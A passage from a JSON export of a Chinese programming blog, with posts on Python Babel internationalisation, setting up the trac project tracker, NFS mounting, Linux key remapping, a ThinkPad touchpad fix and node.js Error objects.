.\/hello.py\n\u5582\n<\/pre>\n<\/li>\n\n<li>\u66f4\u65b0 <code>hello.py<\/code> \uff0c\u8ffd\u52a0\u4e00\u53e5\u201c      print _('World')\u201d\n<\/li>\n\n<li>\u5c06\u201cWorld\u201d\u7ffb\u8bd1\u6210\u4e2d\u6587\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">pybabel extract -F hello.babel . -o hello.i18n\/messages.pot    <span style=\"color: #999999; font-style: italic;\"># <\/span><span style=\"color: #999999; font-style: italic;\">&#20174;&#28304;&#20195;&#30721;&#20013;&#25552;&#21462;&#21487;&#32763;&#35793;&#30340;&#25991;&#26412;&#21040;P<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">OT&#65288;PO&#27169;&#26495;&#65289;&#25991;&#20214;<\/span>\npybabel update -l zh_CN -d .\/hello.i18n -i .\/hello.i18n\/messages.pot    <span style=\"color: #999999; font-style: italic;\"># <\/span><span style=\"color: #999999; font-style: italic;\">&#20174;POT&#25991;&#26412;<\/span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">&#26356;&#26032;&#25351;&#23450;&#35821;&#35328;&#30340;PO&#25991;&#20214;<\/span>\n<span style=\"color: #999999; font-style: italic;\"># <\/span><span style=\"color: #999999; font-style: italic;\">&#24320;&#22987;&#32763;&#35793;&#25351;&#23450;&#35821;&#35328;&#30340;PO&#25991;&#20214;&#65306; hello.i18n\/zh_CN\/LC_MESSAGES\/messages.po<\/span>\npybabel compile -f -d .\/hello.i18n    <span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">&#32534;&#35793;PO&#25991;&#20214;&#20026;MO&#25991;&#20214;<\/span>\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u518d\u6b21\u8fd0\u884c\n\n<pre class=\"example\">\nLC_ALL=zh_CN python .\/hello.py\n\u5582\n\u4e16\u754c\n<\/pre>\n<\/li>\n\n<li>\u7a0b\u5e8f\u4e2d\u5f3a\u5236\u4f7f\u7528\u4e2d\u6587\u8bed\u8a00\uff1a <code>hello.cn.py<\/code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\"><span style=\"color: #99cc99;\">import<\/span> gettext\n\n<span style=\"color: #ffcc66;\">t<\/span> = gettext.translation(<span style=\"color: #66cccc;\">'messages'<\/span>, <span style=\"color: #66cccc;\">'.\/hello.i18n'<\/span>, languages=[<span style=\"color: #66cccc;\">'zh_CN'<\/span>])\n<span style=\"color: #ffcc66;\">_<\/span> = t.gettext\n\n<span style=\"color: #99cc99;\">print<\/span> _(<span style=\"color: #66cccc;\">'Hello'<\/span>)\n<span style=\"color: #99cc99;\">print<\/span> _(<span style=\"color: #66cccc;\">'World'<\/span>)\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5373\u4f7f\u662f\u5728\u82f1\u6587\u73af\u5883\u4e0b\u4e5f\u8f93\u51fa\u4e2d\u6587\n\n<pre class=\"example\">\nLC_ALL=en_US python .\/hello.py\n\u5582\n\u4e16\u754c\n<\/pre>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u5f00\u6e90\u9879\u76ee\u7ba1\u7406\u7cfb\u7edf\uff1atrac",
  "timestamp": "2014-03-10 00:44:00",
  "tags": [
    "python",
    "trac"
  ],
  "body": "<p>\n\u6700\u8fd1\u8d1f\u8d23\u4e3a\u516c\u53f8\u642d\u5efa\u9879\u76ee\u7ba1\u7406\u7cfb\u7edf\uff0c\u6709\u5982\u4e0b\u8981\u6c42\uff1a\n<\/p>\n<ul class=\"org-ul\">\n<li>\u652f\u6301BUG\u7ba1\u7406\n<\/li>\n\n<li>\u652f\u6301\u5e10\u53f7\u7ba1\u7406\n<\/li>\n\n<li>\u652f\u6301WIKI\n<\/li>\n\n<li>\u652f\u6301\u4efb\u52a1\u5206\u914d\n<\/li>\n\n<li>\u652f\u6301\u4e2d\u6587\n<\/li>\n<\/ul>\n\n<p>\n\u7531\u4e8e\u65f6\u95f4\u7d27\u8feb\uff0c\u611f\u89c9 <code>redmine<\/code> \u754c\u9762\u66f4\u6f02\u4eae\uff0c\u76f8\u5173\u8d44\u6599\u4e5f\u597d\u627e\uff0c\u800c\u4e14\u5e10\u53f7\u7ba1\u7406\u3001\u4e2d\u6587\u652f\u6301\u65b9\u9762\u7684\u5f88\u4e0d\u9519\uff0c\u6240\u4ee5\u9009\u62e9\u4e86 <code>redmine<\/code> \u3002\u5176\u5b9e\u5fc3\u91cc\u9762\u4e00\u76f4\u5e0c\u671b\u9009\u7684\u662f\u57fa\u4e8e <code>python<\/code> \u5f00\u53d1\u7684\u7cfb\u7edf\uff0c\u4e00\u65b9\u9762\u81ea\u5df2\u559c\u6b22 <code>python<\/code> \uff0c\u53e6\u5916\u56e2\u961f\u4e2d\u5bf9 <code>python<\/code> \u719f\u6089\u7684\u4eba\u6bd4\u8f83\u591a\uff0c\u8fd9\u6837\u540e\u9762\u9700\u8981\u505a\u4e8c\u6b21\u5f00\u53d1\u65f6\u4f1a\u5bb9\u6613\u4e00\u4e9b\u3002\n<\/p>\n\n<p>\n<code>trac<\/code> \u7ed9\u4eba\u7684\u7b2c\u4e00\u611f\u89c9\u662f\u592a\u8fc7\u4e8e\u7b80\u5355\u7c97\u7cd9\u4e86\u3002\u754c\u9762\u6734\u5b9e\u7b80\u6d01\u5c1a\u53ef\u63a5\u53d7\u3001\u6f14\u793a\u7ad9\u70b9\u4e2d\u6587\u5316\u4e0d\u5f7b\u5e95\u3001\u81ea\u5df2\u5b89\u88c5\u7684\u65f6\u5019\u8f83\u4e4b <code>redmine<\/code> \u66f4\u662f\u78d5\u78d5\u7eca\u7eca\u3002=trac= \u4f7f\u7528 <code>Babel<\/code> \u8fdb\u884c\u591a\u8bed\u8a00\u652f\u6301\uff0c\u5f53\u524d\u7684trac\u7a33\u5b9a\u7248\uff081.0\uff09\u5b58\u5728\u4e2d\u6587\u652f\u6301\u65b9\u9762\u7684Bug\uff1a<a href=\"http:\/\/trac.edgewall.org\/ticket\/10903\">Wrong `NullTranslations` class in functional tests<\/a> \uff0c\u6211\u5728\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u5c31\u9047\u5230\u4e86\uff0c\u6b63\u662f\u8fd9\u4e2a\u95ee\u9898\u624d\u89c9\u5f97\u5148\u7814\u7a76\u4e00\u4e0b <code>Babel<\/code> \uff0c\u4e8e\u662f\u6709\u4e86\u4e0a\u4e00\u7bc7\u6587\u7ae0 \u300a<a href=\"http:\/\/blog.kankanan.com\/posts\/2014\/03\/09_python5e94752856fd96455316ff1ababel.html\">python\u5e94\u7528\u56fd\u9645\u5316\uff1aBabel<\/a>\u300b\uff0c <code>trac<\/code> \u4e0b\u4e00\u7248\uff081.1\uff09\u5bf9\u8fd9\u4e2a\u95ee\u9898\u8fdb\u884c\u4e86\u4fee\u590d\u3002 \u7f51\u7edc\u4e0a\u6709\u5f88\u591a\u4eba\u5bf9 <code>trac<\/code> \u5938\u8d5e\u6709\u52a0\uff0c\u53e6\u5916 <code>trac<\/code> \u8fd8\u6709\u6301\u7eed\u96c6\u6210\u7684\u63d2\u4ef6\uff1a <a href=\"http:\/\/bitten.edgewall.org\/\">Bitten<\/a> \uff0c \u5728\u5bf9 <code>Babel<\/code> \u6709\u4e00\u5b9a\u4e86\u89e3\u540e\uff0c\u6211\u7ec8\u4e8e\u9f13\u6c14\u52c7\u6c14\u7814\u7a76\u8d77 <a href=\"http:\/\/trac.edgewall.org\/\">trac<\/a> \u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u5b89\u88c5\u6700\u65b0\u7248 <code>trac<\/code><\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>\u4f7f\u7528\u5b66\u4e60 <code>Babel<\/code> \u65f6\u5efa\u7684\u865a\u62df\u73af\u5883\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">workon LearnBabel\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u4ece\u6700\u65b0\u6e90\u4ee3\u7801\u5b89\u88c5 <code>trac<\/code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">svn checkout http:\/\/svn.edgewall.org\/repos\/trac\/trunk trac\n<span style=\"color: #cc99cc;\">cd<\/span> trac\npython .\/setup.py install\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5efa\u4e00\u4e2a\u9879\u76ee\u770b\u770b\u6548\u679c\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">cd<\/span> ~\/Examples\/python\ntrac-admin LearnTrac initenv\ntracd --port 8080 LearnTrac &amp;\nxdg-open http:\/\/localhost:8080\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n\n<p>\n\u611f\u89c9 <code>trac<\/code> \u7684\u4e2d\u6587\u5316\u505a\u5f97\u8fd8\u4e0d\u591f\u5f7b\u5e95\uff0c\u4f46\u662f\u5173\u952e\u7684\u90e8\u4f4d\u90fd\u5df2\u7ecf\u4e2d\u6587\u5316\uff0c\u4e0d\u5f71\u54cd\u5bf9\u6574\u4e2a\u7cfb\u7edf\u7684\u4f7f\u7528\uff0c\u6709\u4e86 <code>Babel<\/code> \u7684\u7ecf\u9a8c\u4e4b\u540e\u5bf9\u5b83\u8fdb\u884c\u4e2d\u6587\u5316\u662f\u5f88\u5bb9\u6613\u7684\uff0c\u7ffb\u8bd1\u540e\u63d0\u4ea4\u7ed9 <code>trac<\/code> \u5f00\u53d1\u4eba\u5458\uff0c\u4e5f\u7b97\u662f\u56de\u9988\u5f00\u6e90\u793e\u533a\u4e86\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u914d\u7f6e\u7528\u6237<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>\u521b\u5efa\u5e10\u53f7\u6587\u4ef6 <code>LearnTrac\/conf\/users.digest<\/code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #ffcc66;\">user<\/span>=admin\n<span style=\"color: #ffcc66;\">realm<\/span>=localhost\n<span style=\"color: #ffcc66;\">password<\/span>=admin\n<span style=\"color: #ffcc66;\">file<\/span>=LearnTrac\/conf\/users.digest\n<span style=\"color: #cc99cc;\">echo<\/span> ${<span style=\"color: #ffcc66;\">user<\/span>}:${<span style=\"color: #ffcc66;\">realm<\/span>}:$(<span style=\"color: #cc99cc;\">printf<\/span> <span style=\"color: #66cccc;\">\"${user}:${realm}:${password}\"<\/span> | md5sum - | sed -<span style=\"text-decoration: underline;\">e <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'s\/\\s\\+-\/\/'<\/span><span style=\"text-decoration: underline;\">) &gt;&gt; ${<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">file<\/span><span style=\"text-decoration: underline;\">}<\/span>\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u91cd\u65b0\u542f\u52a8\u670d\u52a1\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\">tracd -p 8080 --<span style=\"color: #ffcc66;\">auth<\/span>=<span style=\"color: #66cccc;\">\"LearnTrac,LearnTrac\/conf\/users.digest,localhost\"<\/span> LearnTrac\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n\n<p>\n\u73b0\u5728\u53ef\u4ee5\u4f7f\u7528 <code>admin<\/code> \u5e10\u53f7\u767b\u5f55\u4e86\n<\/p>\n\n<p>\n\u5e10\u53f7\u7ba1\u7406\u65b9\u9762 <code>trac<\/code> \u6bd4\u8f83\u5f31\uff0c\u53ea\u80fd\u901a\u8fc7 <code>trac-admin<\/code> \u547d\u4ee4\u884c\u5de5\u5177\u6765\u7ba1\u7406\uff0c\u5c0f\u56e2\u961f\u4f7f\u7528\u8fd8\u662f\u53ef\u4ee5\u63a5\u53d7\u7684\uff0c\u53e6\u5916\u4ec5\u652f\u6301HTTP\u8ba4\u8bc1\uff0c\u914d\u4e0aHTTPS\u5e03\u7f72\u5230\u5916\u7f51\u4e5f\u7b97\u662f\u4e0d\u9519\u7684\u9009\u62e9\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u914d\u7f6e\u6743\u9650<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<ul class=\"org-ul\">\n<li>\u4e3a <code>admin<\/code> \u7528\u6237\u8d4b\u4e88\u7ba1\u7406\u5458\u6743\u9650\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\">trac-admin LearnTrac permission add admin TRAC_ADMIN\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n\n<p>\n\u73b0\u5728\u53ef\u4ee5\u5728WEB\u754c\u9762\u4e0a\u770b\u5230\u201c\u7ba1\u7406\u201d\u6807\u7b7e\u9875\u4e86\uff0c\u53ef\u4ee5\u5728WEB\u754c\u9762\u4e0a\u5bf9\u6743\u9650\u8fdb\u884c\u914d\u7f6e\u3002<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u5728linux\u4f7f\u7528nfs\u6302\u8f7d\u5176\u5b83linux\u673a\u5668\u4e0a\u7684\u6587\u4ef6\u5939",
  "timestamp": "2014-09-23 16:52:00",
  "tags": [
    "linux",
    "nfs"
  ],
  "body": "<p>\n\u4e0b\u9762\u7684IP\u5730\u5740\u4ee5\u53ca\u5de5\u4f5c\u76ee\u5f55\u9700\u6309\u5b9e\u9645\u60c5\u51b5\u8fdb\u884c\u4fee\u6539\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u5728\u672c\u5730\u673a\u5668\u4e0a\u5141\u8bb8\u76ee\u5f55\u88ab\u8fdc\u7a0b\u6302\u8f7d\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">echo<\/span> <span style=\"color: #66cccc;\">'\/home\/tangxinfa\/workdir *(rw,sync,no_root_squash)'<\/span> &gt;&gt; \/etc\/exports\nsudo exportfs -arv\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u5728\u8fdc\u7a0b\u673a\u5668\u4e0a\u6302\u8f7d\u672c\u5730\u673a\u5668\u4e0a\u7684\u6587\u4ef6\u5939\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">mkdir \/tmp\/Projects; mount -t nfs -o nolock 192.168.111.100:\/home\/tangxinfa\/Proj<span style=\"text-decoration: underline;\">ects \/tmp\/Projects<\/span>\n<\/pre>\n<\/div>\n<\/li>\n<\/ul>\n\n<p>\n\u95ee\u9898\u8bca\u65ad\n<\/p>\n\n<ul class=\"org-ul\">\n<li>mount: RPC: Unable to receive; errno = Connection refused\n\n<p>\n\u9700\u8981\u542f\u52a8nfs-server\u670d\u52a1\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl enable nfs-server.service\nsudo systemctl start nfs-server.service\n<\/pre>\n<\/div>\n\n<p>\n\u53e6\u5916\uff0c\u5982\u679c\u521a\u521a\u505a\u4e86linux\u5185\u6838\u66f4\u65b0\u800c\u6ca1\u6709\u91cd\u542f\u7cfb\u7edf\u4e5f\u53ef\u80fd\u5bfc\u81f4\u8fd9\u4e2a\u95ee\u9898\uff0c\u91cd\u542f\u4e00\u4e0b\u518d\u8bd5\u3002\n<\/p>\n<\/li>\n\n<li>mount: 192.168.111.100:\/home\/tangxinfa\/Projects failed, reason given by server: Permission denied\n\n<p>\n\u5728\/etc\/exports\u6587\u4ef6\u4e2d\u5141\u8bb8\u76ee\u5f55\u88ab\u8fdc\u7a0b\u6302\u8f7d\u5373\u53ef\u3002<\/p>\n<\/li>\n<\/ul>\n"
},
{
  "title": "linux\u4e0b\u4fee\u6539\u952e\u4f4d\u6620\u5c04",
  "timestamp": "2014-09-19 14:07:00",
  "tags": [
    "linux",
    "keyboard"
  ],
  "body": "<p>\n\u5728linux\u4e0b\u4f1a\u5927\u91cf\u4f7f\u7528ctrl\u548calt\u952e\uff0c\u4f46\u662f\u666e\u901a\u952e\u76d8\u4e0a\u8fd9\u4e24\u4e2a\u952e\u6240\u5728\u4f4d\u7f6e\u592a\u504f\uff0c\u6309\u8d77\u6765\u975e\u5e38\u5403\u529b\uff0c\u4ea4\u6362\u952e\u4f4d\u53ef\u4ee5\u5f88\u597d\u7684\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u901a\u8fc7gnome-tweak-tool\u8fdb\u884c\u4fee\u6539\n\n<p>\nTyping\u9875\u53ef\u4ee5\u5b8c\u6210\u5e38\u7528\u7684\u4fee\u6539\uff0c\u5982\uff1a\u4ea4\u6362Caps Lock\u548cCtrl\uff0c\u4ea4\u6362\u5de6Ctrl\u548cAlt\u3002\u4f46\u662f\u5728\u6211\u7684\u7b14\u8bb0\u672c\u4e0a\u8bbe\u7f6e\u597d\u540e\u6709\u65f6\u5019\u4f1a\u5931\u6548.\n<\/p>\n<\/li>\n\n<li>\u901a\u8fc7setxkbmap\u547d\u4ee4\u8fdb\u884c\u4fee\u6539\n\n<p>\nCaps Lock\u6539\u4e3aCtrl\uff1asetxkbmap -option ctrl:nocaps\n<\/p>\n\n<p>\n\u53ef\u4ee5\u67e5\u770b\/usr\/share\/X11\/xkb\/rules\/evdev.lst\u67e5\u770b\u652f\u6301\u7684\u4ea4\u6362\u65b9\u5f0f\u3002Ctrl\u548cAlt\u4ea4\u6362\u8bd5\u4e86\u4e00\u4e0b\u6ca1\u6709\u6548\u679c\u3002\n<\/p>\n\n<p>\n\u5c06setxkbmap\u8bbe\u7f6e\u547d\u4ee4\u653e\u5230~\/.xprofile\u4e2d\u5373\u53ef\u5f00\u673a\u751f\u6548\u3002\n<\/p>\n<\/li>\n<\/ul>\n\n\n<ul class=\"org-ul\">\n<li>\u901a\u8fc7\u914d\u7f6e~\/.Xmodmap\u8fdb\u884c\u4fee\u6539\n\n<p>\n\u53ef\u4ee5\u5b8c\u6210\u4efb\u610f\u7684\u952e\u76d8\u6620\u5c04\u3002\n<\/p>\n\n<p>\n\u5982\u4e0b\u6240\u793a\uff1aCaps Lock\u6539\u4e3aCtrl\uff0c\u5de6Ctrl\u6539\u4e3aAlt\uff1a\n<\/p>\n\n<pre class=\"example\">\nkeycode 66 = Control_L\nclear Lock\nadd control = Control_L\n\nclear control\nclear mod1\nkeycode 37 = Alt_L Meta_L\nadd control = Control_L Control_R\nadd mod1 = Alt_L Meta_L\n<\/pre>\n\n<p>\n\u542f\u7528\u8bbe\u7f6e\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">xmodmap ~\/.Xmodmap\n<\/pre>\n<\/div>\n\n<p>\n\u5728~\/.xprofile\u4e2d\u6dfb\u52a0\u4ee5\u4e0a\u6307\u4ee4\u4ee5\u4fbf\u5f00\u673a\u751f\u6548\uff1a\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #99cc99;\">if<\/span> [ -f $<span style=\"color: #ffcc66;\">HOME<\/span>\/.Xmodmap ]; <span style=\"color: #99cc99;\">then<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   \/usr\/bin\/xmodmap $<span style=\"color: #ffcc66;\">HOME<\/span>\/.Xmodmap\n<span style=\"color: #99cc99;\">fi<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u53c2\u8003\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li><a href=\"http:\/\/earthviaradio.wordpress.com\/2012\/02\/06\/swapping-the-left-alt-and-ctrl-keys-in-ubuntu-11-10\/\">Swapping the left Alt and Ctrl keys in Ubuntu 11.10<\/a>\n<\/li>\n\n<li><a href=\"http:\/\/efod.se\/writings\/linuxbook\/html\/caps-lock-to-ctrl.html\">Changing your caps lock into Ctrl in X<\/a>\n<\/li>\n\n<li><a href=\"https:\/\/wiki.archlinux.org\/index.php\/Xmodmap_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)\">Xmodmap (\u7b80\u4f53\u4e2d\u6587)<\/a>\n<\/li>\n<\/ul>\n<\/li>\n\n<li>\u6e05\u9664xmodmap\u4ee5\u53casetxkbmap\u7684\u914d\u7f6e\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">setxkbmap -layout us\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u6362hhkb pro2\u952e\u76d8\n\n<p>\nlinux\u7528\u6237\u5fc5\u5907\uff0cctrl\u548calt\u952e\u5df2\u7ecf\u653e\u7f6e\u5230\u6700\u4f18\u4f4d\u7f6e\uff0c\u800c\u4e14\u540e\u9762\u7684\u8df3\u7ebf\u5f00\u5173\u652f\u6301\u5e38\u7528\u7684\u952e\u4f4d\u4ea4\u6362\uff0c\u5373\u4f7f\u662flinux\u6587\u672c\u6a21\u5f0f\u4e0b\u4e5f\u53ef\u7528\u3002<\/p>\n<\/li>\n<\/ul>\n"
},
{
  "title": "Thinkpad T540p\u4fee\u590dlinux\u4e0b\u89e6\u6478\u677f\u6309\u4e0b\u65f6\u5149\u6807\u4f4d\u7f6e\u79fb\u52a8\u95ee\u9898",
  "timestamp": "2014-09-22 14:29:00",
  "tags": [
    "linux",
    "thinkpad"
  ],
  "body": "<ul class=\"org-ul\">\n<li>\u6267\u884c\u4ee5\u4e0b\u8bbe\u7f6e\u547d\u4ee4\u5373\u53ef\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">synclient <span style=\"color: #ffcc66;\">HorizHysteresis<\/span>=30 <span style=\"color: #ffcc66;\">VertHysteresis<\/span>=30\n<\/pre>\n<\/div>\n\n<p>\n\u5c06\u4e0a\u9762\u7684\u547d\u4ee4\u653e\u5230~\/.xprofile\u4e2d\uff0c\u4ee5\u4fbf\u91cd\u542f\u540e\u4ecd\u7136\u751f\u6548\u3002\n<\/p>\n<\/li>\n<\/ul>\n\n<p>\n\u53c2\u8003\uff1a<a href=\"https:\/\/blog.lnx.cx\/2014\/03\/20\/fedora-20-and-the-thinkpad-t440s-touchpad\/\">Fedora 20 and the ThinkPad T440s touchpad | Technitribe<\/a><\/p>\n"
},
{
  "title": "\u7406\u89e3node.js\u4e2d\u7684Error\u5bf9\u8c61",
  "timestamp": "2014-12-09 13:38:00",
  "tags": [
    "node"
  ],
  "body": "<p>\nError\u5bf9\u8c61\u5728 <a href=\"http:\/\/nodejs.org\">node.js<\/a> \u7a0b\u5e8f\u4e2d\u65e0\u5904\u4e0d\u5728\uff0c\u4f46\u662f\u5173\u4e8e\u5b83\u5728 <a href=\"http:\/\/nodejs.org\/docs\/latest\/api\/all.html\">node.js\u6587\u6863<\/a> \uff08\u5199\u8fd9\u7bc7\u6587\u7ae0\u65f6node.js\u7684\u6700\u65b0\u7248\u672c\u4e3av0.10.33\uff09\u4e2d\u5374\u627e\u4e0d\u5230\u63cf\u8ff0\u8d44\u6599\uff0c\u53ea\u5728\u4ee5\u4e0b\u90e8\u5206\u63d0\u53ca\uff1a\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> <a href=\"http:\/\/nodejs.org\/docs\/latest\/api\/all.html#all_util_iserror_object\">util.isError(object)<\/a> <\/dt><dd>\u5224\u65ad\u5bf9\u8c61\u662f\u5426\u4e3aError\u5bf9\u8c61.\n<\/dd>\n\n<dt> <a href=\"http:\/\/nodejs.org\/docs\/latest\/api\/all.html#all_additions_to_error_objects\">Domain: Additions to Error objects<\/a> <\/dt><dd>\u5728Error\u5bf9\u8c61\u4e0a\u9644\u52a0\u989d\u5916\u7684\u5b57\u6bb5.\n<\/dd>\n<\/dl>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">Error\u5230\u5e95\u662f\u4f55\u65b9\u795e\u5723\uff1f<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\nError\u5bf9\u8c61\u662f\u5728ECMAScript 5.1\uff08\u4e8e2011\u5e747\u6708\u53d1\u5e03\uff09\u4e2d <a href=\"http:\/\/www.ecma-international.org\/ecma-262\/5.1\/#sec-15.11\">\u5b9a\u4e49<\/a> \u7684\uff0c\u662f\u4e00\u4e2a\u6bd4\u8f83\u65b0\u7684\u7279\u6027\uff1a\n<\/p>\n\n<blockquote>\n<p>\nInstances of Error objects are thrown as exceptions when runtime errors occur. The Error objects may also serve as base objects for user-defined exception classes.\n<\/p>\n<\/blockquote>\n\n<p>\n\u5b83\u53ea\u6709\u4e24\u4e2a\u5c5e\u6027\uff1a\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> name <\/dt><dd>\u9519\u8bef\u540d\u79f0\uff0c\u9ed8\u8ba4\u4e3a\"Error\"\n<\/dd>\n\n<dt> message <\/dt><dd>\u9519\u8bef\u6d88\u606f\uff0c\u9ed8\u8ba4\u4e3a\"\"\n<\/dd>\n<\/dl>\n\n<p>\nV8\u5b9e\u73b0\u4e86\u4e00\u4e2a\u6269\u5c55\u5c5e\u6027\uff1a\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> stack <\/dt><dd>\u9519\u8bef\u63cf\u8ff0\u53ca\u8c03\u7528\u5806\u6808 \n<\/dd>\n<\/dl>\n\n<p>\n\u5b83\u53ea\u6709\u4e00\u4e2a\u65b9\u6cd5\uff1a\n<\/p>\n\n<dl class=\"org-dl\">\n<dt> toString <\/dt><dd>\u8f6c\u6210\u5b57\u7b26\u4e32\u5f62\u5f0f\uff0c\u901a\u5e38\u4e3a \"name: message\"\n<\/dd>\n<\/dl>\n\n<p>\n\u6784\u9020\u4e00\u4e2aError\u5b9e\u4f8b\uff1a\n<\/p>\n\n<p>\nnew Error(message) \u6216\u8005 Error(message)\uff0c\u4e24\u8005\u662f\u4e00\u6837\u7684\u3002\n<\/p>\n\n<p>\n\u793a\u4f8b\uff1a\u663e\u793a\u9519\u8bef\u6d88\u606f\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">console.log(err);\nconsole.log(err.toString());\nconsole.log(err.message);\n<\/pre>\n<\/div>\n\n<p>\n\u9700\u8981\u6ce8\u610f\u7684\u662fconsole.log(JSON.stringify(err))\u663e\u793a\u7684\u662f\u7a7a\u5bf9\u8c61{}.\n<\/p>\n\n<p>\n\u793a\u4f8b\uff1a\u663e\u793a\u9519\u8bef\u6d88\u606f\u53ca\u8c03\u7528\u5806\u6808\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">console.log(err.stack);\n<\/pre>\n<\/div>\n\n<p>\n\u793a\u4f8b\uff1a\u663e\u793a\u9519\u8bef\u540d\u79f0\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">console.log(err.name);\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u5982\u4f55\u81ea\u5b9a\u4e49Error\u7c7b\u578b\uff1f<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">function<\/span> <span style=\"color: #f99157;\">MyError<\/span>(<span style=\"color: #ffcc66;\">message<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span> <span style=\"color: #6699cc;\">this<\/span>.message = message || <span style=\"color: #66cccc;\">''<\/span>;\n}\n\nMyError.<span style=\"color: #6699cc;\">prototype<\/span> = <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">Error<\/span>();\nMyError.<span style=\"color: #6699cc;\">prototype<\/span>.constructor = MyError;\nMyError.<span style=\"color: #6699cc;\">prototype<\/span>.name = <span style=\"color: #66cccc;\">'MyError'<\/span>;\n<\/pre>\n<\/div>\n\n<p>\nError\u5b9e\u4f8b\u7c7b\u578b\u5224\u65ad\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">err<\/span> = <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">Error<\/span>(<span style=\"color: #66cccc;\">\"this is error\"<\/span>);\n<span style=\"color: #99cc99;\">var<\/span> <span style=\"color: #ffcc66;\">myerr<\/span> = <span style=\"color: #99cc99;\">new<\/span> <span style=\"color: #6699cc;\">MyError<\/span>(<span style=\"color: #66cccc;\">\"this is my error\"<\/span>);\nerr <span style=\"color: #99cc99;\">instanceof<\/span> <span style=\"color: #6699cc;\">Error<\/span> <span style=\"color: #999999; font-style: italic;\">\/*<\/span><span style=\"color: #999999; font-style: italic;\">true*\/<\/span>\nerr <span style=\"color: #99cc99;\">instanceof<\/span> <span style=\"color: #6699cc;\">MyError<\/span> <span style=\"color: #999999; font-style: italic;\">\/*<\/span><span style=\"color: #999999; font-style: italic;\">false*\/<\/span>\nmyerr <span style=\"color: #99cc99;\">instanceof<\/span> <span style=\"color: #6699cc;\">MyError<\/span> <span style=\"color: #999999; font-style: italic;\">\/*<\/span><span style=\"color: #999999; font-style: italic;\">true*\/<\/span>\nmyerr <span style=\"color: #99cc99;\">instanceof<\/span> <span style=\"color: #6699cc;\">Error<\/span> <span style=\"color: #999999; font-style: italic;\">\/*<\/span><span style=\"color: #999999; font-style: italic;\">true*\/<\/span>\n<\/pre>\n<\/div>\n\n<p>\nstack\u8f93\u51fa\u6709\u95ee\u9898\uff1a\u81ea\u5b9a\u4e49\u7684\u9519\u8bef\u63cf\u8ff0\u6ca1\u4e86\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">err.stack <span 